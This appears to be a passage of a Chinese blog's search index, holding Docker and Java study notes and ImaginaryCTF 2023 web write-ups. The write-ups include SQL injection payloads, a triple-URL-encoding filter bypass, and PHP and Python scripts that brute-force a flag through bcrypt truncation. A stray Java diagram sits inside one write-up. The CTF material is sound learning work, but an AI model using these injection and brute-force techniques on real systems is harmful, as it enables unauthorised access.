world&quot;,而是显示容器的ID，说明容器被启动 123docker ps#查看正在运行的容器docker ps -a#查看所有容器docker ps -l#查看最后一次创建的容器 1docker logs &lt;ID/容器名&gt; #查看容器标准输出 12docker stop &lt;ID/容器名&gt;#停止容器docker restart &lt;ID/容器名&gt;#重启容器 1docker pull &lt;镜像名&gt;#拉取镜像 123docker run -itd --name &lt;容器名&gt; &lt;镜像名&gt; /bin/bash#希望容器在后台运行，并给该容器命名#要注意的是加上&quot;-d&quot;默认在后台运行不进入容器，要进入容器用docker attach或docker exec 1docker attach &lt;ID/容器名&gt;#进入容器，exit后容器停止 1docker exec -it &lt;ID/容器名&gt; /bin/bash#exit之后容器在后台运行不关闭 12docker export &lt;ID/容器名&gt; &gt; ./ubuntu.tar#向当前目录导出某个容器cat ./ubuntu.tar | docker import -&lt;容器名&gt;:&lt;tag&gt; 1docker rm -f &lt;ID/容器名&gt; #删除某容器 1docker rename &lt;old_name&gt; &lt;new_name&gt;#重命名某容器 Web应用12docker run -d -P training/webapp python app.py#大写的-P代表随机映射一个端口 访问本地32768端口 12#小写的-p代表指定映射的ip和端口，但是在一个指定端口上只能绑定一个容器#格式：hostPort:containerPort、ip:hostPort:containerPort、ip::containerPort 访问本地23333端口 12docker logs &lt;ID/容器名&gt;#查看截止当前的web应用日志（静态）docker logs -f &lt;ID/容器名&gt;#查看实时web日志（动态） 镜像12docker rmi &lt;镜像名&gt;#删除镜像，rmi中的i是images的意思docker images#查看镜像，复现Dockerfile第一步命令后可以用一下看看是否创建成功镜像 Docker 部署 MySQL先pull一个镜像 1docker pull mysql docker images可以查看是否成功拉取镜像 创建容器并进行端口映射： 1docker run -d -p &lt;port&gt;:3306 --name &lt;容器名&gt; -e MYSQL_ROOT_PASSWORD=&lt;密码&gt; mysql docker ps可以查看是否成功创建容器 启动容器： 1docker start &lt;容器名/ID&gt; 容器启动后，进入容器： 1docker exec -it &lt;容器名/ID&gt; /bin/bash 进入MySQL： 1mysql -u root -p &lt;密码&gt; 修改新密码 1ALTER USER 'root'@'localhost' IDENTIFIED BY '&lt;新密码&gt;'; 开启MySQL远程连接权限： 123CREATE USER &lt;用户名&gt; IDENTIFIED BY '&lt;远程密码&gt;';#创建远程用户GRANT ALL PRIVILEGES ON *.* TO '&lt;用户名&gt;'@'%';#分配权限FLUSH PRIVILEGES;#刷新权限","link":"/2023/04/05/docker-note/"},{"title":"http请求走私","text":"HTTP请求走私第一次接触该漏洞是从CSAW2023的一道题： //emmm比赛环境关闭了(尬) //总而言之就是利用CVE-2019-20372的nginx版本1.17.7以下的http请求走私漏洞 常见的chunked形式的HTTP报文： 123456789101112POST /index.php?id=1 HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedTransfer-Encodeing: chunked1aa=To be or not to be,that eia a question.0 1a为十六进制，表示在下一行内容中传输26个字符，使用chunked方式传输内容可以一次性发送，也可以切分后多次发送。0代表传输结束，最后还要加上两个’\\r\\n‘","link":"/2023/09/19/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"title":"imaginary_ctf","text":"imaginary_ctf2023webIdoriot打开题目看了眼，登陆加注册感觉是二次注入之类的，登陆界面闭合注释啥的都试了下，结果长得都一样↓，点进注册页面看看 xxxxxxxxxx ┌─ ┌──────────────────────────────────┐ │ │ Compiler, debugger, etc. │ │ └──────────────────────────────────┘ JDK ┌─ ┌──────────────────────────────────┐ │ │ │ │ │ JRE │ JVM + Runtime Library │ │ │ │ │ └─ └─ └──────────────────────────────────┘ ┌───────┐┌───────┐┌───────┐┌───────┐ │Windows││ Linux ││ macOS ││others │ └───────┘└───────┘└───────┘└───────┘ascii 随便账号输了个单引号闭合闭合666’，密码随便输了个123，网页回显源代码： 1234567891011121314151617181920212223242526272829303132333435363738Welcome, User ID: 126181005Source Code&lt;?phpsession_start();// Check if user is logged inif (!isset($_SESSION['user_id'])) { header(&quot;Location: login.php&quot;); exit();}// Check if session is expiredif (time() &gt; $_SESSION['expires']) { header(&quot;Location: logout.php&quot;); exit();}// Display user ID on landing pageecho &quot;Welcome, User ID: &quot; . urlencode($_SESSION['user_id']);// Get the user for admin$db = new PDO('sqlite:memory:');$admin = $db-&gt;query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')-&gt;fetch();// Check if the user is adminif ($admin['user_id'] === $_SESSION['user_id']) { // Read the flag from flag.txt $flag = file_get_contents('flag.txt'); echo &quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;; echo &quot;&lt;p&gt;$flag&lt;/p&gt;&quot;;} else { // Display the source code for this file echo &quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;; highlight_file(__FILE__);}?&gt; 从代码逻辑可以看出当执行sql语句SELECT * FROM users WHERE user_id = 0 LIMIT 1后第一行user_id的值和当前网页会话SESSION['user_id']相等时回显flag，从SQL查询语句容易得到就是要让SESSION['user_id']值为0，退出登录去logout.php，重新点注册，是session的话就说明是在提交表单环节设置的，bp抓个包,改post参数user_id为0，Forward。 getflag idoriot-revenge和上一题同样的开头，先注册点开 随便一个账号密码回显源码： 1234567891011121314151617181920212223242526272829303132333435363738394041Welcome, User ID: 736136856Source Code&lt;?phpsession_start();// Check if user is logged inif (!isset($_SESSION['user_id'])) { header(&quot;Location: login.php&quot;); exit();}// Check if session is expiredif (time() &gt; $_SESSION['expires']) { header(&quot;Location: logout.php&quot;); exit();}// Display user ID on landing pageecho &quot;Welcome, User ID: &quot; . urlencode($_SESSION['user_id']);// Get the user for admin$db = new PDO('sqlite:memory:');$admin = $db-&gt;query('SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1')-&gt;fetch();// Check user_idif (isset($_GET['user_id'])) { $user_id = (int) $_GET['user_id']; // Check if the user is admin if ($user_id == &quot;php&quot; &amp;&amp; preg_match(&quot;/&quot;.$admin['username'].&quot;/&quot;, $_SESSION['username'])) { // Read the flag from flag.txt $flag = file_get_contents('/flag.txt'); echo &quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;; echo &quot;&lt;p&gt;$flag&lt;/p&gt;&quot;; }}// Display the source code for this fileecho &quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;;highlight_file(__FILE__);?&gt; 看下面这部分： 12345678910111213$admin = $db-&gt;query('SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1')-&gt;fetch();// Check user_idif (isset($_GET['user_id'])) { $user_id = (int) $_GET['user_id']; // Check if the user is admin if ($user_id == &quot;php&quot; &amp;&amp; preg_match(&quot;/&quot;.$admin['username'].&quot;/&quot;, $_SESSION['username'])) { // Read the flag from flag.txt $flag = file_get_contents('/flag.txt'); echo &quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;; echo &quot;&lt;p&gt;$flag&lt;/p&gt;&quot;; }} SQL查询语句查询结果$admin['username']的值显然为’admin’，这回是检验GET传参数$user_id是否弱等于’php’，以及$_SESSION['username']是否包含$admin['username']，即’admin’，若比较由于会类型转换再比较，因此直接修改GET参数user_id值为’php’即可，至于preg_match(&quot;/&quot;.$admin['username'].&quot;/&quot;, $_SESSION['username'])条件，注册时随便注册一个包含’admin’的字符串作为用户名即可， 再改参数： getflag roks网页内容： 点’get rok picture’会随机显示一张石头的图片，查看源代码： index.php主要内容如下，点击鼠标触发事件随机获取一张图片的url，然后直接带着url参数跳转到/file.php?file=url页面， 12345678910111213141516171819202122button onclick=&quot;requestRandomImage()&quot;&gt;get rok picture&lt;/button&gt; &lt;script&gt; function requestRandomImage() { var imageList = [&quot;image1&quot;, &quot;image2&quot;, &quot;image3&quot;, &quot;image4&quot;, &quot;image5&quot;, &quot;image6&quot;, &quot;image7&quot;, &quot;image8&quot;, &quot;image9&quot;, &quot;image10&quot;] var randomIndex = Math.floor(Math.random() * imageList.length); var randomImageName = imageList[randomIndex]; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) { var blob = xhr.response; var imageUrl = URL.createObjectURL(blob); document.getElementById(&quot;randomImage&quot;).src = imageUrl; } }; xhr.open(&quot;GET&quot;, &quot;file.php?file=&quot; + randomImageName, true); xhr.responseType = &quot;blob&quot;; xhr.send(); } &lt;/script&gt; file.php内容如下： 12345678910111213&lt;?php $filename = urldecode($_GET[&quot;file&quot;]); if (str_contains($filename, &quot;/&quot;) or str_contains($filename, &quot;.&quot;)) { $contentType = mime_content_type(&quot;stopHacking.png&quot;); header(&quot;Content-type: $contentType&quot;); readfile(&quot;stopHacking.png&quot;); } else { $filePath = &quot;images/&quot; . urldecode($filename); $contentType = mime_content_type($filePath); header(&quot;Content-type: $contentType&quot;); readfile($filePath); }?&gt; if (str_contains($filename, &quot;/&quot;) or str_contains($filename, &quot;.&quot;))条件防止任意文件读取，但是注意看$filename是经过参数file进行url解码得到的，PHP在获取GET参数的时候解码一次(获取POST参数时不会)，算上else里解码一次，总共需要进行三次解码，两次解码过后$filename不能含有/和.字符，因此，总共需要经过三次url编码，使得在不破坏url结构的同时能够绕过字符串过滤达到文件读取，那读什么文件呢，看下dockerfile，存在： 1COPY flag.png / 传参： blank后端最核心部分代码： 1234567891011121314151617181920212223242526272829303132333435...........app.get('/login', (req, res) =&gt; { res.render('login');});app.post('/login', (req, res) =&gt; { const username = req.body.username; const password = req.body.password; db.get('SELECT * FROM users WHERE username = &quot;' + username + '&quot; and password = &quot;' + password+ '&quot;', (err, row) =&gt; { if (err) { console.error(err); res.status(500).send('Error retrieving user'); } else { if (row) { req.session.loggedIn = true; req.session.username = username; res.send('Login successful!'); } else { res.status(401).send('Invalid username or password'); } } });});..........app.get('/flag', (req, res) =&gt; { if (req.session.username == &quot;admin&quot;) { res.send('Welcome admin. The flag is ' + fs.readFileSync('flag.txt', 'utf8')); } else if (req.session.loggedIn) { res.status(401).send('You must be admin to get the flag.'); } else { res.status(401).send('Unauthorized. Please login first.'); }}); 'SELECT * FROM users WHERE username = &quot;'拼接username拼接'&quot; and password = &quot;'拼接password拼接'&quot;'最终username和password均为双引号闭合 随便一个常规字符输入会显示Invalid username or password，但是传入双引号后出现Error retrieving user报错回显，这里注意，***sqlite3和Oracle不支持#号单行注释，只能使用–***，传入&quot;--，报错消失，再次变为Invalid username or password，探路完成，下面看源代码： 12345if (row) { req.session.loggedIn = true; req.session.username = username; res.send('Login successful!'); } 要查询到结果，才能登陆成功，并设置session，没有session直接访问/flag会 123else { res.status(401).send('Unauthorized. Please login first.'); } 这里就是一个简单的利用select查询字符串，当然我们得让原来的查询语句无查询结果，或者联合查询完后用limit语句，来使得查询结果为一条对吧。 之后第一个坑来了(个人做题时)，判断原查询结果字段数，别问，问就是上来没order by上来就是union select 1,2，默认只有用户名和密码两个字段了呜呜呜，结果咋地都是报错，卡了有一会，后面头脑发光，转过来了，欸，应该是有第三个字段，试了下&quot; union select 1,2,3--，欸，不出所料 判断字段数，很重要呜呜呜 然后捏，当我们满心欢喜拿到session去访问/flag时，欸嘿 好吧扭头回去看源代码： 12345if (row) { req.session.loggedIn = true; req.session.username = username; res.send('Login successful!'); } session的username值是username赋的，username是我们传入的用户名(const username = req.body.username;)，所以就是说，弄了那么久，最后传进来的用户名是那一大坨”payload”，设置的session也是。。。不慌，想让传入的username值为admin，很好满足，别急，别忘了还有一个password注入点。 这回我们直接传入username为admin，懒得判断原查询结果哪个字段是admin了，索性三个都弄成admin，上payload： 12username:adminpassword:&quot; union select 'admin','admin','admin'-- 之后SQL语句变为： 1SELECT * FROM users WHERE username = &quot;admin&quot; and password = &quot;&quot; union select 'admin','admin','admin'--&quot; 登陆成功后访问/flag，拿到flag： Perfect Picture看一眼源代码就是修改图片像素参数 Login当你感觉什么都没有的时候，为什么不按下F12呢？ ————鲁迅 直接传/?source 源代码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif (isset($_GET['source'])) { highlight_file(__FILE__); die();}$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';$db = new SQLite3('/db.sqlite3');$username = $_POST['username'] ?? '';$password = $_POST['password'] ?? '';$msg = '';if (isset($_GET[$magic])) { $password .= $flag;}if ($username &amp;&amp; $password) { $res = $db-&gt;querySingle(&quot;SELECT username, pwhash FROM users WHERE username = '$username'&quot;, true); if (!$res) { $msg = &quot;Invalid username or password&quot;; } else if (password_verify($password, $res['pwhash'])) { $u = htmlentities($res['username']); $msg = &quot;Welcome $u! But there is no flag here :P&quot;; if ($res['username'] === 'admin') { $msg .= &quot;&lt;!-- magic: $magic --&gt;&quot;; } } else { $msg = &quot;Invalid username or password&quot;; }}?&gt; #下面html中还嵌着一个&lt;?= $msg ?&gt; ??：php8新加入的，如果前面的变量不存在，就将后面的默认字符串赋值， 123$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';#如果无法从环境变量中获取到FLAG，那么就把后面的那个赋值给$flag$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';#同理#主打的就是一个保险（ 在学习安全的路上首次亮相password_verify()函数亮相，判断变量$password的hash值是否等于第二个参数(存入数据库当中的经哈希处理后的字符串)，然后还要$res[‘username’]为’admin’，怎么想了想和上一题blank好像很像，至于构造hash字符串编码，php中有对应的password_hash()函数，先随便生成个密码看看 123456&lt;?php$input = &quot;666&quot;;$hash = password_hash($input,PASSWORD_DEFAULT);echo $hash;#output:$2y$10$gJWTsCxZTfjNlqN7hVqCF.QKzQ6giNnSpayWxWvG6gnOUTikgJ3Im 嗯。。在这之前我一定测试过字段数，我一定不是随便写两个字段下去的 总之和上一道题差不多的操作之后，成功让password验证成功，看一眼注释，拿到那个magic： 回到源代码： 123if (isset($_GET[$magic])) { $password .= $flag;} 是的，没错。。是.=我从第一眼就没见到那个点点，这为我之后的懵逼历程埋下了大大的伏笔。。。 什么意思呢，如果有GET传入$magic，也就是688a35c685a7a654abc80f8e123ad9f0，那么password变量就会与flag拼接起来，这也将是我们之后的突破口。 然后开始懵逼，最开始没看到那个点点，一度想尝试过爆破逐一比对hash，结果捏，三四十个预选字符，长度大概二十多三十多吧，也就40多的30多次方种情况吧，不多不多（ 然后就求助与学长了，其实当时如果自己去php官网有目的性地查找，是能够查询到password_hash的相关特性的 使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节，这是官方给出的描述 当时我没去自己查相关特性，求助了L1ao学长，他给了个trick，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把.=看成 =了呜呜呜呜呜，下面是trick的内容 12345$cont=71; echo password_verify(str_repeat(&quot;a&quot;,$cont), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWFalse$cont=72; echo password_verify(str_repeat(&quot;a&quot;,$cont), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWTrue PASSWORD_BCRYPT加密的时候只对前72个字节加密，超过72字节的部分不管，根据这个我们可以得出： 1234567891011$cont=71; echo password_verify(str_repeat(&quot;a&quot;,$cont), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWORD_BCRYPT)//False$cont=72; echo password_verify(str_repeat(&quot;a&quot;,$cont), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWORD_BCRYPT)//True$cont=71; echo password_verify(str_repeat(&quot;a&quot;,$cont).substr($password,0,1), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWORD_BCRYPT).'i'//True$cont=70; echo password_verify(str_repeat(&quot;a&quot;,$cont).substr($password,0,2), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWORD_BCRYPT).'ic'//True$cont=69; echo password_verify(str_repeat(&quot;a&quot;,$cont).substr($password,0,3), password_hash(str_repeat(&quot;a&quot;,$cont).&quot;b&quot;, PASSWORD_BCRYPT).'ict'//True........ 由于是传入$magic之后$password是拼接在用户传入的部分后面的，(这里我们暂称重复的71个’a’为冗余字节)所以可以从71一个一个减少用户传入的冗余字节数，每次减少一个字节数之后，遍历候选字符集，拼接在冗余字节和已知password部分后面(不要每次都只拼接在冗余字节后面，要爆出来一个就紧跟在a后面) 最开始的时候不知道为啥闲着没事就用php而不是python写了一个脚本： 1234567891011121314151617181920212223242526272829303132&lt;?php$flag = '';$url = 'http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0';$pre = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?{}_&quot;;$arr = str_split($pre);for($re = 71;$re &gt; 0;$re--){ foreach ($arr as $i){ $username = str_repeat(&quot;a&quot;,$re); $password = password_hash(str_repeat(&quot;a&quot;,$re).$flag.$i, PASSWORD_BCRYPT); $post = array( 'password' =&gt; $username, 'username' =&gt; '\\' union select \\'admin\\',\\''.$password.'\\'--' ); #echo $post['username']; $post = http_build_query($post); $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_POST, 1); curl_setopt($curl, CURLOPT_POSTFIELDS, $post); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $res = curl_exec($curl); curl_close($curl); if(strstr($res,'Welcome')){ $flag .= $i; echo $flag; echo &quot;\\n&quot;; break; } #echo $res; }}?&gt; 有点小慢，问chatgpt知道python里是有一个bcrypy库的，于是再写了个python脚本，写完之后发现其实速度大差不差 123456789101112131415161718192021222324252627import requestsimport bcryptflag = ''pre = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?1234567890}{_&quot;for re in range(71,0,-1): for i in pre: #print(flag) password = &quot;a&quot; * re username = &quot;a&quot; * re + flag + i hashed_password = bcrypt.hashpw(username.encode('utf-8'), bcrypt.gensalt()) post_data = { 'password': password, 'username': '\\' union select \\'admin\\',\\'' + hashed_password.decode('utf-8') + '\\'--' } #print(&quot;username:&quot;+username+&quot;\\n&quot;) #print(post_data) url = 'http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0' response = requests.post(url, data=post_data) res = response.text if 'Welcome' in res: flag += i print(flag) break 超酷的好吗 MISCSignpost一道社工题，给了个路标，找经纬度，大致能看清图片上信息： 距SCOTTSDALE STADIUM 761英里 距离POLO(?)GROUNDS 2925英里 距SEALS STADIUM2英里 本来，按理来说是要分别找到这三个已知点的经纬度，根据距离画三个圆，三个圆的交点便是目标点附近，但是。。 根据题目描述，这个地方是在一个ball park主题公园，当时我在快乐搜索这三个已知点的时候 直觉告诉我这就是题目要的ballpark，Google Earth，启动！！ emmmm，我不管！！肯定就是Oracle Park！！ 获取经纬度 联想到社工误差较大，给了一定的容错空间 但是就在附近的话经纬度变化不会太大 377.779±0.03,-122.389±0.03 试了十几次试出来了","link":"/2023/07/23/imaginary-ctf/"},{"title":"java_note","text":"浅记Java学习记录 JRE：运行Java字节码的虚拟机 JDK：如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。 1234567891011 ┌─ ┌──────────────────────────────────┐ │ │ Compiler, debugger, etc. │ │ └──────────────────────────────────┘JDK ┌─ ┌──────────────────────────────────┐ │ │ │ │ │ JRE │ JVM + Runtime Library │ │ │ │ │ └─ └─ └──────────────────────────────────┘ ┌───────┐┌───────┐┌───────┐┌───────┐ │Windows││ Linux ││ macOS ││others │ └───────┘└───────┘└───────┘└───────┘ Java基础语法12345public class Main { public static void main(String[] args) { System.out.printf(&quot;Hello World!&quot;); }} public：访问修饰符 static：关键字 void：返回类型 main：方法名 String[] args也可写为String args[]，为避免歧义尽量用前者 注意： java大小写敏感 类名首字母应大写，如果由多个单词组成，每个单词首字母大写 方法名应该以驼峰式写法 源文件名必须与类名相同 主方法入口：所有的java程序由public static void main(String[] args)方法开始执行 构造方法： 12345678910public class Puppy{ public Puppy(String name){ System.out.println(&quot;name is &quot;+name ); } public static void main(String[] args){ // 下面的语句将创建一个Puppy对象 Puppy myPuppy = new Puppy( &quot;potato&quot; ); }} 构造方法无类型 浮点数强制转换为整型舍弃小数位而不是四舍五入 静态变量： Java 中的静态变量是指在类中定义的一个变量，它与类相关而不是与实例相关，即无论创建多少个类实例，静态变量在内存中只有一份拷贝，被所有实例共享。 静态变量在类加载时被创建，在整个程序运行期间都存在。 123MyClass.count = 10; // 通过类名访问MyClass obj = new MyClass();obj.count = 20; // 通过实例名访问 常量：(用final关键字修饰) 1234567891011public class AppConfig { public static final String APP_NAME = &quot;MyApp&quot;; public static final String APP_VERSION = &quot;1.0.0&quot;; public static final String DATABASE_URL = &quot;jdbc:mysql://localhost:3306/mydb&quot;; public static void main(String[] args) { System.out.println(&quot;Application name: &quot; + AppConfig.APP_NAME); System.out.println(&quot;Application version: &quot; + AppConfig.APP_VERSION); System.out.println(&quot;Database URL: &quot; + AppConfig.DATABASE_URL); }} 访问控制修饰符 Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。 default (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。 private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类） public : 对所有类可见。使用对象：类、接口、变量、方法 protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。 用户输入： 123456789101112131415import java.util.Scanner;public class Age{ public static void main(String[] args){ Scanner myScanner = new Scanner(System.in); System.out.println(&quot;请输入你的姓名：&quot;); String name = myScanner.next(); System.out.println(&quot;请输入你的年龄：&quot;); int age = myScanner.nextInt(); System.out.println(&quot;请输入你的身高：&quot;); double height = myScanner.nextDouble(); System.out.println(name+&quot;今年&quot;+age+&quot;岁了，身高&quot;+height); } } 12345678910111213141516171819202122232425262728293031323334import java.util.Scanner;public class BreakExercise02 {//编写一个 main 方法public static void main(String[] args) {//实现登录验证，有 3 次机会，如果用户名为&quot;丁真&quot; ,密码&quot;666&quot;提示登录成功，//否则提示还有几次机会，请使用 for+break 完成//// 思路分析// 1. 创建 Scanner 对象接收用户输入// 2. 定义 String name ; String passwd; 保存用户名和密码// 3. 最多循环 3 次[登录 3 次]，如果 满足条件就提前退出// 4. 定义一般变量 int chance 记录还有几次登录机会//// 代码实现Scanner myScanner = new Scanner(System.in);String name = &quot;&quot;;String passwd = &quot;&quot;;int chance = 3; //登录一次 ，就减少一次for( int i = 1; i &lt;= 3; i++) {//3System.out.println(&quot;请输入名字&quot;);name = myScanner.next();System.out.println(&quot;请输入密码&quot;);passwd = myScanner.next();//比较输入的名字和密码是否正确//补充说明字符串 的内容 比较 使用的 方法 equalsif(&quot;丁真&quot;.equals(name) &amp;&amp; &quot;666&quot;.equals(passwd)) {System.out.println(&quot;恭喜你，登录成功~&quot;);break;}//登录的机会就减少一次chance--;System.out.println(&quot;你还有&quot; + chance + &quot;次登录机会&quot;);} **equals()**方法的用法！ 数组的动态分配： 12345//(1) 第一种动态分配方式//double scores[] = new double[5];//(2) 第 2 种动态分配方式， 先声明数组，再 new 分配空间double scores[] ; //声明数组， 这时 scores 是 nullscores = new double[5]; // 分配内存空间，可以存放数据 Java数组赋值传地址而不是传值 12int[] arr1 = {1,2,3};int[] arr2 = arr1; 如果想复制数组并属于独立的数据空间，可以新开辟一块内存，然后传值赋值： 12345678int[] arr1 = {10,20,30};//创建一个新的数组 arr2,开辟新的数据空间//大小 arr1.length;int[] arr2 = new int[arr1.length];//遍历 arr1 ，把每个元素拷贝到 arr2 对应的元素位置for(int i = 0; i &lt; arr1.length; i++) {arr2[i] = arr1[i];} 方法重载： 方法名必须相同，形参类型和形参个数至少一个不同，返回类型无要求 关于”There is no default constructor available in …”，出现这个问题主要是因为子类继承了父类，但是因为父类定义了有参构造方法，导致默认的无参构造方法消失，子类无法从父类继承到默认构造方法，所以要显式在子类构造函数中调用父类的有参构造函数： ↓这是父类的构造函数： ↓这是子类的构造函数： 123456789101112131) 子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访问，要通过父类提供公共的方法去访问2) 子类必须调用父类的构造器， 完成父类的初始化3) 当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过(怎么理解。) [举例说明]4) 如果希望指定去调用父类的某个构造器，则显式的调用一下 : super(参数列表)5) super 在使用时，必须放在构造器第一行(super 只能在构造器中使用)6) super() 和 this() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器7) java 所有类都是 Object 类的子类, Object 是所有类的基类. 8) 父类构造器的调用不限于直接父类！将一直往上追溯直到 Object 类(顶级父类)9) 子类最多只能继承一个父类(指直接继承)，即 java 中是单继承机制。思考：如何让 A 类继承 B 类和 C 类？ 【A 继承 B， B 继承 C】10) 不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关 方法重载和重写的对比： eg: 12Animal animal = new Cat();//b编译类型Animal，运行类型Cat()animal = new Dog();//运行类型改成了Dog() 多态的前提是：两个对象(类)存在继承关系多态的向上转型： 多态向下转型： 1234567891011121314151617181920212223242526public static void main(String[] args) {//向上转型: 父类的引用指向了子类的对象//语法：父类类型引用名 = new 子类类型();Animal animal = new Cat();Object obj = new Cat();//可以吗? 可以 Object 也是 Cat 的父类//向上转型调用方法的规则如下://(1)可以调用父类中的所有成员(需遵守访问权限)//(2)但是不能调用子类的特有的成员//(#)因为在编译阶段，能调用哪些成员,是由编译类型来决定的//animal.catchMouse();错误//(4)最终运行效果看子类(运行类型)的具体实现, 即调用方法时，按照从子类(运行类型)开始查找方法//，然后调用，规则我前面我们讲的方法调用规则一致。animal.eat();//猫吃鱼.. animal.run();//跑animal.show();//hello,你好animal.sleep();//睡//老师希望，可以调用 Cat 的 catchMouse 方法//多态的向下转型//(1)语法：子类类型 引用名 =（子类类型）父类引用;//问一个问题? cat 的编译类型 Cat,运行类型是 CatCat cat = (Cat) animal;cat.catchMouse();//猫抓老鼠//(2)要求父类的引用必须指向的是当前目标类型的对象Dog dog = (Dog) animal; //可以吗？System.out.println(&quot;ok~~&quot;);}} 属性没有重写一说，属性的值看编译类型： 12345678910111213141516package com.hspedu.poly_.detail_;public class PolyDetail02 {public static void main(String[] args) {//属性没有重写之说！属性的值看编译类型Base base = new Sub();//向上转型System.out.println(base.count);// ？ 看编译类型 10Sub sub = new Sub();System.out.println(sub.count);//? 20}}class Base { //父类int count = 10;//属性}class Sub extends Base {//子类int count = 20;//属性} instanceof 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型，eg： 123456789101112131415161718192021package Main;public class PolyDetail03 { public static void main(String[] args) { BB bb = new BB(); System.out.println(bb instanceof BB);// true System.out.println(bb instanceof AA);// true//aa 编译类型 AA, 运行类型是 BB//BB 是 AA 子类 AA aa = new BB(); System.out.println(aa instanceof AA); System.out.println(aa instanceof BB); Object obj = new Object(); System.out.println(obj instanceof AA);//false String str = &quot;hello&quot;;//System.out.println(str instanceof AA); System.out.println(str instanceof Object);//true }}class AA {} //父类class BB extends AA {}//子类 ！！！！！动态绑定机制：：： 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839package Main;public class PolyDetail03 { public static void main(String[] args) { A a = new B(); System.out.println(a.sum()); System.out.println(a.suml()); }}class A{ public int i = 10; public int sum(){ return getl() + 10; } public int suml(){ return i + 10; } public int getl(){ return i; }}class B extends A{ public int i = 20; @Override public int sum(){ return i + 20; } @Override public int getl(){ return i; } @Override public int suml(){ return i + 10; }} 输出：40 30， B类继承A类，main()方法里，创建了一个B类的对象a，但是引用类型是A类，意味着a实际上是一个B类的对象，但是通过A类的引用进行访问。B类里重写了sum()，suml()，getl()方法，根据多态的原则，会先调用实际对象的方法。所以调用了B中的sum()和suml()方法，调用的i也是B类中的，即20，因此返回40和30 再有代码如下： 123456789101112131415161718192021222324252627282930313233343536373839package Main;public class PolyDetail03 { public static void main(String[] args) { A a = new B(); System.out.println(a.sum()); System.out.println(a.suml()); }}class A{ public int i = 10; public int sum(){ return getl() + 10; } public int suml(){ return i + 10; } public int getl(){ return i; }}class B extends A{ public int i = 20;// @Override// public int sum(){// return i + 20;// } @Override public int getl(){ return i; }// @Override// public int suml(){// return i + 10;// }} B类中将sum()和suml()方法重写给注释掉了，因此会调用父类A类中的sum和suml方法，i也调用A类中的，所以输出30 20 代码块： 1234567891011121314151617181920//(1) 下面的三个构造器都有相同的语句//(2) 这样代码看起来比较冗余//(3) 这时我们可以把相同的语句，放入到一个代码块中，即可//(4) 这样当我们不管调用哪个构造器，创建对象，都会先调用代码块的内容//(5) 代码块调用的顺序优先于构造器.. //(6) 代码块只能用static修饰，static 代码块，是在类加载时，执行的，而且只会执行一次//(7) 普通的代码块，在创建对象实例时，会被隐式的调用{System.out.println(&quot;电影屏幕打开...&quot;);System.out.println(&quot;广告开始...&quot;);System.out.println(&quot;电影正是开始...&quot;);};public Movie(String name) {System.out.println(&quot;Movie(String name) 被调用...&quot;);this.name = name;}public Movie(String name, double price) {this.name = name;this.price = price;} 抽象类：当父类的某些方法需要声明但是又不知道如何实现时，可将其声明为抽象方法，其所在类被称为抽象类，用abstract关键字修饰 抽象类用abstract关键词修饰 用abstract关键词修饰方法，该方法就是抽象方法，不能含有方法主体 抽象类不能被实例化 抽象类不一定要包含抽象方法，但是抽象方法所在类一定要被声明为抽象类 abstract只能修饰类和方法 抽象方法不能使用private，final，static来修饰 12345678910111213141516171819202122232425262728293031323334353637383940package Main;public class Main { public static void main(String[] args) { Zombie zo1 = new Zombie(); Crepper crep1 = new Crepper(); zo1.run(); zo1.attack(); crep1.run(); crep1.attack(); }}abstract class monster { public void attack(){}; public void run(){};}class Zombie extends monster{ @Override public void attack(){ System.out.println(&quot;僵尸在攻击&quot;); } @Override public void run(){ 